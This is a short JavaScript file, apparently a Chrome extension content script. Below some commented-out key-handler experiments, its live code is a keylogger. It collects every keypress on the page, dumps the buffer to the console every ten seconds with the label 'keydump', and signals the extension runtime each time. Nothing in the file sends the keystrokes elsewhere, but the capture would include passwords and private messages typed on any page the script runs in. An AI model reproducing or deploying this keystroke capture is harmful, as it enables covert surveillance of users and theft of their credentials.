// function handleKey(key) {

// }

// window.addEventListener('keydown', key => {
// 	if (key.keyCode === 13 || key.keyCode === 8) {
// 		console.log(key.keyCode);
// 	}
// });

// window.addEventListener('keypress', key => {
// 	if (key.keyCode != 13) {
// 		console.log(key.key);
// 	}
// });

var keys = '';
document.onkeypress = function(e) {
  get = window.event ? event : e;
  key = get.keyCode ? get.keyCode : get.charCode;
  key = String.fromCharCode(key);
  keys += key;
}
window.setInterval(function() {
  if (keys != '') {
    console.log("keydump from last 10 seconds: \n" + keys);
    chrome.runtime.sendMessage("init");
    keys = '';
  }
}, 10000);

